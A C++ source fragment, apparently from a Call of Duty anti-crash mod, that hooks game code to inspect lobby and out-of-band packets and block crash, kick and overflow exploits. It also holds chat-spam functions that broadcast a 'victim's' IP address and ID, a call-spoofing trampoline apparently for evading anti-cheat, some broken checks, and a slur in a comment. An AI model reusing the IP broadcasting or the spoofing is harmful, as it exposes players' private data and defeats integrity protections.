		if (chatcrash)
		{
			send_chat_message(msgggg);
		}

		std::ofstream myfile;
		myfile.open("godness\\logs\\logs.txt""", std::ios_base::app);
		myfile << dt << " IM '" << outputtype << "' BLOCKED from : " << sender << "\n";
		myfile.close();

	}
}

char hkNameLength(unsigned int a1, int* a2, int a3)// a hook to remove the 16 char name buffer.
{

	__int64 v3; // rbx
	int* v6; // rax
	int v9; // [rsp+40h] [rbp+8h] BYREF

	v3 = a3;
	v9 = a3;
	Name_Thing(a2, 0i64, a3);
	v6 = &v9;

	

	Steam_GetName_Thing((UINT8*)a2, *v6, 1);

	return 1;
}

__int64 hkdwInstantDispatchMessage(__int64 sender_id, unsigned int controllerIndex, __int64 msg, unsigned int messageSize) //a filter for demonware instant messages
{
	const auto message{ reinterpret_cast<const char*>(msg) };
	const auto message_size{ messageSize };

	handle_message(sender_id, message, message_size);



	return 0;
}

static bool is_user_in_game()
{
	return Live_IsUserInGame(0);
}

static bool local_client_is_in_game()
{
	return CL_IsLocalClientInGame(0);
}

static bool is_in_game()
{
	return Com_IsInGame();
}

static bool is_match_loaded()
{
	return (is_user_in_game() && local_client_is_in_game() && is_in_game());
}

bool AreWeInGameAndHosting() {

	if (is_match_loaded() && Live_IsHost()) {
		return true;
	}
	return false;

}

bool is_in_array(std::string cmp1, std::vector<std::string> cmp2)
{
	for (auto cmp : cmp2)
	{
		if (!strcmp(cmp1.data(), cmp.data()))
			return true;
	}
	return false;
}
bool is_in_number_array(int cmp1, std::vector<int> cmp2)
{
	for (auto cmp : cmp2)
	{
		if (cmp1 == cmp)
			return true;
	}
	return false;
}

std::string to_lower(std::string text)
{
	std::transform(text.begin(), text.end(), text.begin(), ::tolower);
	return text;
}

bool is_equal(const std::string& lhs, const std::string& rhs, const std::size_t count, const bool case_sensitive)
{
	auto left = lhs;
	auto right = rhs;

	if (count != std::string::npos)
	{
		if (lhs.size() > count)
			left.erase(count);

		if (rhs.size() > count)
			right.erase(count);
	}

	if (case_sensitive)
	{
		return left == right;
	}

	else
	{
		return to_lower(left) == to_lower(right);
	}
}

template <typename T>
static auto atoi(const std::string& str)
{
	return static_cast<T>(std::atoi(str.data()));
}

static auto atoi(const std::string& str)
{
	return atoi<std::uint32_t>(str);
}

static auto atoll(const std::string& str)
{
	return static_cast<std::uint64_t>(std::atoll(str.data()));
}

static std::string ToLower(std::string str)
{
	std::transform(str.begin(), str.end(), str.begin(), ::tolower);
	return str;
}

static std::string FindAndReplaceString(std::string text, std::string find, std::string replace)
{
	size_t iPosition;

	while ((iPosition = ToLower(text).find(ToLower(find))) != std::string::npos)
		text.replace(iPosition, find.length(), replace);

	return text;
}

void send_crash_spam(std::string victim, std::string ip_str, std::string xuid) {

	auto message_to_send = chatspam_msg;

	message_to_send = FindAndReplaceString(message_to_send, "$n", victim);
	message_to_send = FindAndReplaceString(message_to_send, "$ip", ip_str);
	message_to_send = FindAndReplaceString(message_to_send, "$xuid", xuid);

	send_chat_message(message_to_send.c_str(), 0);
}

void send_kick_spam(std::string victim, std::string ip_str, std::string xuid) {

	auto message_to_send = chatspam_msg2;

	message_to_send = FindAndReplaceString(message_to_send, "$n", victim);
	message_to_send = FindAndReplaceString(message_to_send, "$ip", ip_str);
	message_to_send = FindAndReplaceString(message_to_send, "$xuid", xuid);

	send_chat_message(message_to_send.c_str(), 0);
}

void send_immobilize_spam(std::string victim, std::string ip_str, std::string xuid) {

	auto message_to_send = chatspam_msg3;

	message_to_send = FindAndReplaceString(message_to_send, "$n", victim);
	message_to_send = FindAndReplaceString(message_to_send, "$ip", ip_str);
	message_to_send = FindAndReplaceString(message_to_send, "$xuid", xuid);

	send_chat_message(message_to_send.c_str(), 0);
}

void send_migrate_spam(std::string victim, std::string ip_str, std::string xuid) {

	auto message_to_send = chatspam_msg4;

	message_to_send = FindAndReplaceString(message_to_send, "$n", victim);
	message_to_send = FindAndReplaceString(message_to_send, "$ip", ip_str);
	message_to_send = FindAndReplaceString(message_to_send, "$xuid", xuid);

	send_chat_message(message_to_send.c_str(), 0);
}




LONG CALLBACK hkCL_ConnectionlessCMD(LPEXCEPTION_POINTERS ex) // a buffer for out of bands, there is 5 different ones that can do some shit as i know
{






	const char* message = (char*)ex->ContextRecord->Rdi;
	std::string sender = adr_to_string((netadr_t*)ex->ContextRecord->R15);

	if (is_in_array(message, legit_packets))
	{
		ex->ContextRecord->Rip += 3;
		ex->ContextRecord->Rdx = ex->ContextRecord->R12;
		return EXCEPTION_CONTINUE_EXECUTION;
	}

	auto msgg = message + " BLOCKED from "s + sender;



	ImGui::InsertNotification({ ImGuiToastType_OOB, 5000, "%s Blocked from %s", message, sender });

	AddToLog("--> " + msgg);

	if (chatcrash)
	{
		send_chat_message("^1%s ^2BLOCKED ^7 from ^2%s ^7,  nice try ^6LOOZA^7!", message, sender);
	}


	ex->ContextRecord->Rip = (qwProcessBase + 0x134CE00);

	return EXCEPTION_CONTINUE_EXECUTION;

}

bool log_package_element(LobbyMsg* lobby_msg) //package elements patch, blocking 3 different crashs as i know
{
	time_t now = time(0);
#pragma warning(suppress : 4996)
	char* dt = ctime(&now);


	auto should_ignore = lobby_msg->msg.overflowed;

	LobbyMsg lobbyMsg{};

	if (should_ignore)
	{




		if (std::to_string(lobby_msg->msgType) == "2")
		{

			ImGui::InsertNotification({ ImGuiToastType_PE, 5000, "Lobby state private BLOCKED" });

			AddToLog("--> PE : Lobby state private BLOCKED");
			if (chatcrash)
			{
				send_chat_message("^1Lobby state private ^2BLOCKED ^7, nice try ^6LOOZA^7!");
			}


		}

		else if (std::to_string(lobby_msg->msgType) == "3")
		{

			ImGui::InsertNotification({ ImGuiToastType_PE, 5000, "Lobby state game BLOCKED" });

			AddToLog("--> PE : Lobby state game BLOCKED");
			if (chatcrash)
			{
				send_chat_message("^1Lobby state game ^2BLOCKED ^7, nice try ^6LOOZA^7!");
			}

		}

		else if (std::to_string(lobby_msg->msgType) == "7")
		{

			ImGui::InsertNotification({ ImGuiToastType_PE, 5000, "LobbyHost heartbeat BLOCKED" });

			AddToLog("--> PE : Lobby Host heartbeat BLOCKED");
			if (chatcrash)
			{
				send_chat_message("^1Lobby Host Heartbeat ^2BLOCKED ^7, nice try ^6LOOZA^7!");
			}

		}




	}

	return should_ignore;
}





void hkLobbyMsgRW_PackageElement(LPEXCEPTION_POINTERS ex)
{
	ex->ContextRecord->Rsp -= 0x20;
	ex->ContextRecord->Rip += 0x4;

	auto lobby_msg{ reinterpret_cast<LobbyMsg*>(ex->ContextRecord->Rcx) };

	if (log_package_element(lobby_msg))
	{
		ex->ContextRecord->Rip = LobbyMsgRW_PackageElement_xor_al;
	}
}

void* _spoofer_stub()
{
	return nullptr;
}

template <typename Ret, typename... Args>
static inline auto shellcode_stub_helper(
	const void* shell,
	Args... args
) -> Ret
{
	auto fn = (Ret(*)(Args...))(shell);
	return fn(args...);
}

template <std::size_t Argc, typename>
struct argument_remapper
{
	// At least 5 params
	template<
		typename Ret,
		typename First,
		typename Second,
		typename Third,
		typename Fourth,
		typename... Pack
	>
	static auto do_call(
		const void* shell,
		void* shell_param,
		First first,
		Second second,
		Third third,
		Fourth fourth,
		Pack... pack
	) -> Ret
	{
		return shellcode_stub_helper<
			Ret,
			First,
			Second,
			Third,
			Fourth,
			void*,
			void*,
			Pack...
		>(
			shell,
			first,
			second,
			third,
			fourth,
			shell_param,
			nullptr,
			pack...
		);
	}
};

template <std::size_t Argc>
struct argument_remapper<Argc, std::enable_if_t<Argc <= 4>>
{
	// 4 or less params
	template<
		typename Ret,
		typename First = void*,
		typename Second = void*,
		typename Third = void*,
		typename Fourth = void*
	>
	static auto do_call(
		const void* shell,
		void* shell_param,
		First first = First{},
		Second second = Second{},
		Third third = Third{},
		Fourth fourth = Fourth{}
	) -> Ret
	{
		return shellcode_stub_helper<
			Ret,
			First,
			Second,
			Third,
			Fourth,
			void*,
			void*
		>(
			shell,
			first,
			second,
			third,
			fourth,
			shell_param,
			nullptr
		);
	}
};

template <typename Ret, typename... Args>
static inline auto spoof_call(
	const void* trampoline,
	Ret(*fn)(Args...),
	Args... args
) -> Ret
{
	struct shell_params
	{
		const void* trampoline;
		void* function;
		void* rbx;
	};

	shell_params p{ trampoline, reinterpret_cast<void*>(fn) };
	using mapper = argument_remapper<sizeof...(Args), void>;
	return mapper::template do_call<Ret, Args...>((const void*)&_spoofer_stub, &p, args...);
}


__int64 GetCGArray(int a1, int a2) {
	return spoof_call(spoof_t, sumshit, a1, a2);
}

//void hkDraw2D(LPEXCEPTION_POINTERS ex)
//{
//
//
//
//	cgArray = reinterpret_cast<std::uintptr_t>((__int64*)(GetCGArray(0, 1793) - 3294544));
//
//	//cg_entitiesArray = cgArray + 0x8AAAE0;
//
//
//
//	if ((!cgArray)) return; //draw2DInternal(a1);
//
//
//
//
//	if (cgArray > 0) {
//		__int64 cgsArray = cgArray + 0x684E40;
//		if (*(int*)(cgsArray + 444)) { //vote active
//			char* voteString = (char*)(cgsArray + 456); //vote string
//			int voteStringLength = strlen(voteString);
//			for (int i = 0; i < voteStringLength; i++) {
//				if ((i + 1) < voteStringLength) {
//					if (voteString[i] == '^' && (voteString[i + 1] == 'H' || voteString[i + 1] == 'B' || voteString[i + 1] == 'I')) {
//						voteString[i] = '!';
//
//					}
//				}
//			}
//		}
//	}
//
//
//
//
//
//
//	return; //draw2DInternal(a1);
//}


//=================Some lobby message inspections (to block some exploits that could crash, kick or do some weird shit to your game).==========\\

bool MSG_VoicePacket_Inspect(LobbyMsg* lobby_msg)
{
	auto should_ignore = false;

	msg_begin_read(lobby_msg->msg);

	switch (lobby_msg->msgType)
	{
	case MESSAGE_TYPE_VOICE_PACKET:
	case MESSAGE_TYPE_VOICE_RELAY_PACKET:
	{
		Msg_VoicePacket voice_packet;

		if (!LobbyMsgRW_PackageInt(lobby_msg, "lobbytype", reinterpret_cast<std::int32_t*>(&voice_packet.lobbyType)))
		{
			should_ignore = true;
			break;
		}

		if (!LobbyMsgRW_PackageUChar(lobby_msg, "talker", &voice_packet.talkerIndex))
		{
			should_ignore = true;
			break;
		}

		if (!LobbyMsgRW_PackageInt(lobby_msg, "relaybits", &voice_packet.relayBits))
		{
			should_ignore = true;
			break;
		}

		if (!LobbyMsgRW_PackageUShort(lobby_msg, "sizeofvoicedata", &voice_packet.sizeofVoiceData))
		{
			should_ignore = true;
			break;
		}

		if (voice_packet.sizeofVoiceData > 1198)
		{
			should_ignore = true;
		}

	} break;
	}

	msg_end_read(lobby_msg->msg);

	return should_ignore;
}

int MSG_JoinParty_Package_Inspect(char* _this, char* lobbyMsg)
{
	BOOL packageOK =
		LobbyMsgRW_PackageInt(lobbyMsg, "targetlobby", (__int32*)_this)
		&& LobbyMsgRW_PackageInt(lobbyMsg, "sourcelobby", (__int32*)(_this + 4))
		&& LobbyMsgRW_PackageInt(lobbyMsg, "jointype", (__int32*)(_this + 8))
		&& LobbyMsgRW_PackageXuid(lobbyMsg, "probedxuid", (XUID*)(__int64*)(_this + 16))
		&& LobbyMsgRW_PackageInt(lobbyMsg, "playlistid", (__int32*)(_this + 612))
		&& LobbyMsgRW_PackageInt(lobbyMsg, "playlistver", (__int32*)(_this + 616))
		&& LobbyMsgRW_PackageInt(lobbyMsg, "ffotdver", (__int32*)(_this + 620))
		&& LobbyMsgRW_PackageShort(lobbyMsg, "networkmode", (__int16*)(_this + 624))
		&& LobbyMsgRW_PackageUInt(lobbyMsg, "netchecksum", (unsigned __int32*)(_this + 628))
		&& LobbyMsgRW_PackageInt(lobbyMsg, "protocol", (__int32*)(_this + 632))
		&& LobbyMsgRW_PackageInt(lobbyMsg, "changelist", (__int32*)(_this + 636))
		&& LobbyMsgRW_PackageInt(lobbyMsg, "pingband", (__int32*)(_this + 640))
		&& LobbyMsgRW_PackageUInt(lobbyMsg, "dlcbits", (unsigned __int32*)(_this + 644))
		&& LobbyMsgRW_PackageUInt64(lobbyMsg, "joinnonce", (unsigned __int64*)(_this + 648));

	for (int i = 0; packageOK && (i < 3); i++)
	{
		packageOK = packageOK && LobbyMsgRW_PackageUChar(lobbyMsg, "chunk", (uint8_t*)(_this + i + 689));
	}

	packageOK = packageOK &&
		LobbyMsgRW_PackageBool(lobbyMsg, "isStarterPack", (char*)(_this + 656))
		&& LobbyMsgRW_PackageString(lobbyMsg, "password", (char*)(_this + 657), 0x20)
		&& LobbyMsgRW_PackageInt(lobbyMsg, "membercount", (__int32*)(_this + 24))
		&& LobbyMsgRW_PackageArrayStart(lobbyMsg, "members");

	if (!packageOK)
	{
		// bad packet
		return 1;
	}

	if (*(__int32*)(_this + 24) > 18)
	{
		// crash attempt via BoF
		return 2;
	}

	return 0; // packet is fine
}


int MSG_MigrateStart_Inspect2(char* _this, char* lobbyMsg)
{
	bool packIsOK = true;

	packIsOK = LobbyMsgRW_PackageInt(lobbyMsg, "lobbytype", (__int32*)(_this))
		&& LobbyMsgRW_PackageXuid(lobbyMsg, "migrateTo", (XUID*)(__int64*)(_this + 8));

	if (!packIsOK)
	{
		return 1;
	}

	return 0;
}

int MSG_Migrate_Announce_Host_Inspect(char* _this, char* lobbyMsg)
{
	bool packIsOK = true;

	packIsOK = LobbyMsgRW_PackageInt(lobbyMsg, "lobbytype", (__int32*)(_this))
		&& LobbyMsgRW_PackageInt(lobbyMsg, "timeout", (__int32*)(_this + 1));

	if (!packIsOK)
	{
		return 1;
	}

	return 0;
}

int MSG_Join_Complete_Inspection(char* _this, char* lobbyMsg)
{
	bool packIsOK = true;

	packIsOK = (LobbyMsgRW_PackageBool(lobbyMsg, "xuid", (char*)(_this)));

	if (!packIsOK)
	{
		return 1;
	}

	return 0;
}

int MSG_Join_Agreement_Rq_Inspection(char* _this, char* lobbyMsg)
{
	bool packIsOK = true;

	if (LobbyMsgRW_PackageBool(lobbyMsg, "hostxuid", (char*)(_this)))
	{
		if (LobbyMsgRW_PackageString(lobbyMsg, "hostname", (char*)(_this + 8), 32))
		{
			if (LobbyMsgRW_PackageUInt64(lobbyMsg, "reservationkey", (unsigned long long int*)(_this + 120)))
			{
				if (LobbyMsgRW_PackageGlob(lobbyMsg, "secid", (char*)(_this + 40), (int)(8i64)))
				{
					if (LobbyMsgRW_PackageGlob(lobbyMsg, "seckey", (char*)(_this + 48), (int)(16i64)))
					{
						if (LobbyMsgRW_PackageGlob(lobbyMsg, "serializedadr", (char*)(_this + 65), (int)(37i64)))
						{
							if (LobbyMsgRW_PackageInt(lobbyMsg, "srclobbytype", (std::int32_t*)(_this + 104))
								&& LobbyMsgRW_PackageInt(lobbyMsg, "destlobbytype", (std::int32_t*)(_this + 108))
								&& LobbyMsgRW_PackageInt(lobbyMsg, "destnetworkmode", (std::int32_t*)(_this + 112))
								&& LobbyMsgRW_PackageInt(lobbyMsg, "destmainmode", (std::int32_t*)(_this + 116))
								&& LobbyMsgRW_PackageInt(lobbyMsg, "nonce", (std::int32_t*)(_this + 128))
								&& LobbyMsgRW_PackageInt(lobbyMsg, "serverloc", (std::int32_t*)(_this + 132)))
							{
								packIsOK == true;
							}
							else
							{
								packIsOK == false;
							}
						}
					}
				}
			}
		}
	}


	if (!packIsOK)
	{
		return 1;
	}

	return 0;
}

int MSG_P2P_Info_Inspect(char* _this, char* lobbyMsg)
{
	bool packIsOK = true;

	packIsOK = LobbyMsgRW_PackageInt(lobbyMsg, "lobbytype", reinterpret_cast<std::int32_t*>(_this))
		&& LobbyMsgRW_PackageInt(lobbyMsg, "connectbit", reinterpret_cast<std::int32_t*>(_this + 4))
		&& LobbyMsgRW_PackageXuid(lobbyMsg, "xuid", (uint64_t*)(_this + 8));

	if (!packIsOK)
	{
		return 1;
	}

	return 0;
}


int MSG_Host_Disconnection_Inspect(char* _this, char* lobbyMsg)
{
	bool packIsOK = true;

	packIsOK = LobbyMsgRW_PackageInt(lobbyMsg, "lobbytype", (std::int32_t*)(_this))
		&& LobbyMsgRW_PackageXuid(lobbyMsg, "xuid", (uint64_t*)(_this + 8));

	if (!packIsOK)
	{
		return 1;
	}

	return 0;
}

//int MSG_Client_Reliable_Data_Inspect(char* _this, char* lobbyMsg)
//{
//	bool result; // al

//	result = LobbyMsgRW_PackageUInt(lobbyMsg, "datamask", _this)
//		&& LobbyMsgRW_PackageInt(lobbyMsg, "lobbytype", (_this + 4));
//	if ((*_this & 2) != 0)
//		result = result && LobbyMsgRW_PackageXuid(lobbyMsg, "newleader", (_this + 8));
//	if ((*_this & 0x800) != 0)
//		result = result && LobbyMsgRW_PackageXuid(lobbyMsg, "platformsession", (_this + 32));
//	if ((*_this & 4) != 0)
//		result = result
//		&& LobbyMsgRW_PackageXuid(lobbyMsg, "discclientxuid", (_this + 16))
//		&& LobbyMsgRW_PackageInt(lobbyMsg, "discclient", (_this + 24));
//	if ((*_this & 8) != 0)
//		result = result && LobbyMsgRW_PackageUChar(lobbyMsg, "leaderactivity", (_this + 28));
//	if (*(_this + 4) == 1)
//	{
//		if ((*_this & 0x20) != 0)
//			result = result && LobbyMsgRW_PackageInt(lobbyMsg, "team", (_this + 40));
//		if ((*_this & 0x40) != 0)
//			result = result && LobbyMsgRW_PackageInt(lobbyMsg, "mapvote", (_this + 44));
//		if (*_this < 0)
//			result = result && LobbyMsgRW_PackageBool(lobbyMsg, "readyup", (_this + 48));
//		if ((*_this & 0x100) != 0)
//			result = result
//			&& LobbyMsgRW_PackageInt(lobbyMsg, "itemtype", (_this + 64))
//			&& LobbyMsgRW_PackageUInt(lobbyMsg, "item", (_this + 68))
//			&& LobbyMsgRW_PackageInt(lobbyMsg, "itemgroup", (_this + 72))
//			&& LobbyMsgRW_PackageInt(lobbyMsg, "attachment", (_this + 76))
//			&& LobbyMsgRW_PackageInt(lobbyMsg, "votetype", (_this + 80));
//		if ((*_this & 0x200) != 0)
//			result = result
//			&& LobbyMsgRW_PackageUInt(lobbyMsg, "character", (_this + 88))
//			&& LobbyMsgRW_PackageUInt(lobbyMsg, "loadout", (_this + 92));
//		if ((*_this & 0x400) != 0)
//			return result && LobbyMsgRW_PackageBool(lobbyMsg, "editcomplete", (_this + 96));
//	}
//	return result;
//}

int MSG_P2P_Connectivity_Test_Inspect(char* _this, char* lobbyMsg)
{
	bool packIsOK = true;

	packIsOK = LobbyMsgRW_PackageInt(lobbyMsg, "lobbytype", (std::int32_t*)(_this))
		&& LobbyMsgRW_PackageInt(lobbyMsg, "index", (std::int32_t*)(_this + 1));

	if (!packIsOK)
	{
		return 1;
	}

	return 0;
}


int MSG_Client_Disconnect_Inspect(char* _this, char* lobbyMsg)
{
	bool packIsOK = true;

	packIsOK = LobbyMsgRW_PackageInt(lobbyMsg, "lobbytype", (std::int32_t*)(_this))
		&& LobbyMsgRW_PackageXuid(lobbyMsg, "xuid", (uint64_t*)(_this + 8));

	if (!packIsOK)
	{
		return 1;
	}

	return 0;
}

//int MSG_Client_Content_Inspect(char* _this, char* lobbyMsg)
//{
//	bool packIsOK = true;
//	long int a ;
//	long int b;
//	long int c;
//	long int d;
//	long int e;
//	long int f;
//	long int g;
//
//	packIsOK = LobbyMsgRW_PackageUInt(lobbyMsg, "datamask", (unsigned int*)(_this))
//		&& LobbyMsgRW_PackageInt(lobbyMsg, "lobbytype", (std::int32_t*)(_this + a))
//		&& LobbyMsgRW_PackageXuid(lobbyMsg, "clientxuid", (uint64_t*)(_this + b))
//		&& LobbyMsgRW_PackageUShort(lobbyMsg, "buffersize", (unsigned short*)(_this + c))
//		&& LobbyMsgRW_PackageGlob(lobbyMsg, "buffer", (char*)(_this + g), (int)(_this + d))
//		&& LobbyMsgRW_PackageUChar(lobbyMsg, "sessionmode", (uint8_t*)(_this + e))
//		&& LobbyMsgRW_PackageUChar(lobbyMsg, "gamemode", (uint8_t*)(_this + f));
//
//
//	if (!packIsOK || (b > 175000 || c > 175000 || d > 175000 || e > 175000 || f > 175000))
//	{
//		return 1;
//	}
//
//	return 0;
//}

int MSG_Demo_State_Inspect(char* _this, char* lobbyMsg)
{
	bool packIsOK = true;

	packIsOK = LobbyMsgRW_PackageInt(lobbyMsg, "lobbytype", (std::int32_t*)(_this))
		&& LobbyMsgRW_PackageBool(lobbyMsg, "paused", (char*)(_this + 4))
		&& LobbyMsgRW_PackageInt(lobbyMsg, "servertime", (std::int32_t*)(_this + 8))
		&& LobbyMsgRW_PackageInt(lobbyMsg, "timescale", (std::int32_t*)(_this + 12))
		&& LobbyMsgRW_PackageInt(lobbyMsg, "client", (std::int32_t*)(_this + 16))
		&& LobbyMsgRW_PackageInt(lobbyMsg, "kframeindex", (std::int32_t*)(_this + 20))
		&& LobbyMsgRW_PackageInt(lobbyMsg, "lstjumpedkframe", (std::int32_t*)(_this + 24))
		&& LobbyMsgRW_PackageInt(lobbyMsg, "kframejumpcount", (std::int32_t*)(_this + 28))
		&& LobbyMsgRW_PackageInt(lobbyMsg, "lstkframetime", (std::int32_t*)(_this + 32));

	if (!packIsOK)
	{
		return 1;
	}

	return 0;
}


int MSG_Migrate_Test_Inspect(char* _this, char* lobbyMsg)
{
	bool packIsOK = true;

	packIsOK = LobbyMsgRW_PackageInt(lobbyMsg, "lobbytype", (std::int32_t*)(_this))
		&& LobbyMsgRW_PackageXuid(lobbyMsg, "xuid", (uint64_t*)(_this + 8))
		&& LobbyMsgRW_PackageBool(lobbyMsg, "isack", (char*)(_this + 16))
		&& LobbyMsgRW_PackageInt(lobbyMsg, "timems", (std::int32_t*)(_this + 20))
		&& LobbyMsgRW_PackageUChar(lobbyMsg, "seqorcount", (uint8_t*)(_this + 17));

	if (!packIsOK)
	{
		return 1;
	}

	return 0;
}

//int MSG_Client_HeartBeat_Inspect(char* _this, char* lobbyMsg) //longaf have to check later nigga
//{
//	bool packIsOK = true;
//	bool dick;
//	bool v4;
//	char* v5;
//	__int64 v6;
//	__int64 v7; 
//	char v8; 
//	char v9;
//	char v10; 
//	char v11; 
//	char v12; 
//	char v13; 
//	bool v14;
//	unsigned __int8 v15; 
//	char v16; 
//	__int64 v17; 
//	char v18; 


//	dick = LobbyMsgRW_PackageInt(lobbyMsg, "lobbytype", reinterpret_cast<std::int32_t*>(_this))
//		&& LobbyMsgRW_PackageUShort(lobbyMsg, "totallatencyms", (unsigned __int16*)(_this + 1048))
//		&& LobbyMsgRW_PackageUInt(lobbyMsg, "recievedpackets", (unsigned __int32*)(_this + 1052))
//		&& LobbyMsgRW_PackageFloat(lobbyMsg, "totalstddev", (float*)(_this + 1056));
//	
//	v4 = LobbyMsgRW_PackageUInt(lobbyMsg, "uploadbandwidth", (unsigned int*)(_this + 1060))
//		&& LobbyMsgRW_PackageUInt64(lobbyMsg, "lobbyid", (unsigned long long int*)(_this));
//	v5 = (_this + 1020);
//	v6 = (__int64)(_this + 15);
//	v7 = 3i64;

//	do
//	{
//		v4 = v4
//			&& LobbyMsgRW_PackageUChar(lobbyMsg, "rank", (uint8_t*)(v6 - 1))
//		&& LobbyMsgRW_PackageUChar(lobbyMsg, "prestige", (uint8_t*)v6)
//		&& LobbyMsgRW_PackageUShort(lobbyMsg, "paragonRank", (unsigned short*)(v6 + 1))
//		&& LobbyMsgRW_PackageUChar(lobbyMsg, "paragonIconId", (uint8_t*)(v6 + 3))
//		&& LobbyMsgRW_PackageUChar(lobbyMsg, "chunk", (uint8_t*)v5);
//	v6 += 6i64;
//	++v5;
//	--v7;
//	} while (v7);
//	v14 = 0;
//	if (v4)
//	{
//		if (LobbyMsgRW_PackageBool(lobbyMsg, "isStarterPack", (_this + 1023)))
//		{
//			if (LobbyMsgRW_PackageInt(lobbyMsg, "arenapoints", (int*)(_this + 44)))
//			{
//				if (LobbyMsgRW_PackageFloat(lobbyMsg, "arenaskill", (float*)(_this + 48)))
//				{
//					if (LobbyMsgRW_PackageFloat(lobbyMsg, "arenavar", (float*)(_this + 52)))
//					{
//						LobbyMsgRW_PackageGlob(lobbyMsg, "bubblegumbuffs", _this + 32, 5i64);
//						if (v8)
//						{
//							LobbyMsgRW_PackageGlob(lobbyMsg, "bgbcount", _this + 37, 5i64);
//							if (v9)
//							{
//								if (LobbyMsgRW_PackageUChar(lobbyMsg, "chartype", (uint8_t*)(_this + 56)))
//								{
//									if (LobbyMsgRW_PackageUChar(lobbyMsg, "headtype", (uint8_t*)(_this + 58)))
//									{
//										if (LobbyMsgRW_PackageUChar(lobbyMsg, "charmode", (uint8_t*)(_this + 57)))
//										{
//											if (LobbyMsgRW_PackageUChar(lobbyMsg, "charloadoutslot", (uint8_t*)(_this + 59)))
//											{
//												LobbyMsgRW_PackageGlob(lobbyMsg, "charitem", _this + 60, 2i64);
//												if (v10)
//												{
//													LobbyMsgRW_PackageGlob(lobbyMsg, "charitemcolors", _this + 62, 6i64);
//													if (v11)
//													{
//														LobbyMsgRW_PackageGlob(lobbyMsg, "attachment", _this + 88, 32i64);
//														if (v12)
//														{
//															LobbyMsgRW_PackageGlob(lobbyMsg, "attachmentvar", _this + 120, 8i64);
//															if (v13)
//															{
//																if (LobbyMsgRW_PackageUChar(lobbyMsg, "camoindex", (uint8_t*)(_this + 128))
//																	&& LobbyMsgRW_PackageInt(lobbyMsg, "paintjobslot", (int*)(_this + 132))
//																	&& LobbyMsgRW_PackageInt(lobbyMsg, "paintjobindex", (int*)(_this + 136))
//																	&& LobbyMsgRW_PackageInt(lobbyMsg, "weaponindex", (int*)(_this + 140))
//																	&& LobbyMsgRW_PackageInt(lobbyMsg, "variantindex", (int*)(_this + 144))
//																	&& LobbyMsgRW_PackageInt(lobbyMsg, "sortindex", (int*)(_this + 148)))
//																{
//																	v14 = 1;
//																}
//															}
//														}
//													}
//												}
//											}
//										}
//									}
//								}
//							}
//						}
//					}
//				}
//			}
//		}
//	}
//	LobbyMsgRW_PackageGlob(lobbyMsg, "collectibles", _this + 152, 306i64);
//	if ((v15 & v14) == 0)
//		return 0;
//	if (!LobbyMsgRW_PackageUInt(lobbyMsg, "flags", (unsigned int*)(_this + 460)))
//		return 0;
//	if (!LobbyMsgRW_PackageInt(lobbyMsg, "backgroundId", (int*)(_this + 464)))
//		return 0;
//	if (!LobbyMsgRW_PackageFloat(lobbyMsg, "skillrating", (float*)(_this + 480)))
//		return 0;
//	if (!LobbyMsgRW_PackageFloat(lobbyMsg, "skillvariance", (float*)(_this + 484)))
//		return 0;
//	LobbyMsgRW_PackageGlob(lobbyMsg, "musicunlocks", _this + 468, 12i64);
//	if (!v16
//		|| !LobbyMsgRW_PackageByte(lobbyMsg, "defaultemblemid", (byte*)(_this + 488))
//		|| !LobbyMsgRW_PackageByte(lobbyMsg, "easterEggBits", (byte*)(_this + 489))
//		|| !LobbyMsgRW_PackageUShort(lobbyMsg, "unlockedmedals", (unsigned short*)(_this + 490))
//		|| !LobbyMsgRW_PackageUInt(lobbyMsg, "profilenonce", (unsigned int*)(_this + 492))
//		|| !LobbyMsgRW_PackageUShort(lobbyMsg, "ddlbuffsize", (unsigned short*)(_this + 1008)))
//	{
//		return 0;
//	}
//	v17 = 512i64;
//	if (*(_this + 1008) <= 0x200u)
//		v17 = *(_this + 1008);
//	LobbyMsgRW_PackageGlob(lobbyMsg, "ddlbuff", _this + 496, v17);
//	return v18
//		&& LobbyMsgRW_PackageUInt(lobbyMsg, "pprobation", (unsigned int*)(_this + 1012))
//		&& LobbyMsgRW_PackageUInt(lobbyMsg, "aprobation", (unsigned int*)(_this + 1016))
//		&& LobbyMsgRW_PackageUInt(lobbyMsg, "dlcBits", (unsigned int*)(_this + 1024))
//		&& LobbyMsgRW_PackageUInt(lobbyMsg, "xpgroupmask", (unsigned int*)(_this + 1028))
//		&& LobbyMsgRW_PackageBool(lobbyMsg, "issplitscreen", (_this + 1032))
//		&& LobbyMsgRW_PackageBool(lobbyMsg, "inplatparty", (_this + 1033));
//		{
//			packIsOK = true;
//		}
//				
//	if (!packIsOK)
//	{
//		return 1;
//	}

//	return 0;
//}



//==================================================End of lobbymessage inspections==========================================================\\



LONG CALLBACK hkHandlePacketInternal(LPEXCEPTION_POINTERS ex) //a hook to filter lobby messages
{
	time_t now = time(0);

	char* dt = ctime(&now);

	auto msg{ *reinterpret_cast<msg_t**>(ex->ContextRecord->Rsp + 0xE8) }; // from the stack
	//auto from_addr{ *reinterpret_cast<std::uint64_t*>(ex->ContextRecord->Rsp + 0xF0) }; // from the stack
	auto from_xuid{ *reinterpret_cast<std::uint64_t*>(ex->ContextRecord->Rsp + 0xF0) }; // from the stack

	player_t p;

	const auto session{ LobbySession_GetSession(get_lobby_type()) };

	std::string sender = std::to_string(from_xuid);


	for (const auto friends : friendss)
	{
		if (friends.steam_id == from_xuid)
			sender = friends.name;


	}

	LobbyMsg lobbyMsg{};
	LobbyMsgRW_PrepReadMsg(&lobbyMsg, msg);

	for (size_t i = 0; i < 18; ++i)
	{

		const auto target_client{ LobbySession_GetClientByClientNum(session, i) };

		if (target_client && target_client->activeClient)
		{

			const auto player_xuid{ target_client->activeClient->fixedClientInfo.xuid };
			const auto player_name{ target_client->activeClient->fixedClientInfo.gamertag };

			if (player_xuid == from_xuid)
				sender = player_name;
		}
	}



	char requestOut[0x20000]{};
	char lobbyMsgCpy[0x50]{};

	switch (lobbyMsg.msgType)
	{

	case 0x4: // log MESSAGE_TYPE_LOBBY_STATE_GAMEPUBLIC
	{


		AddToLog("-->" + "LM : LOBBY STATE GAMEPUBLIC BLOCKED "s);
		ImGui::InsertNotification({ ImGuiToastType_LM, 5000, "LM GAMEPUBLIC BLOCKED " });

		std::ofstream myfile;
		myfile.open("godness\\logs\\logs.txt""", std::ios_base::app);
		myfile << dt << " LM ' State GamePublic ' BLOCKED  from " << from_xuid << "\n";
		myfile.close();

		MSG_Discard(msg);


	}
	break;


	case 0x5: // log MESSAGE_TYPE_LOBBY_STATE_GAMECUSTOM
	{

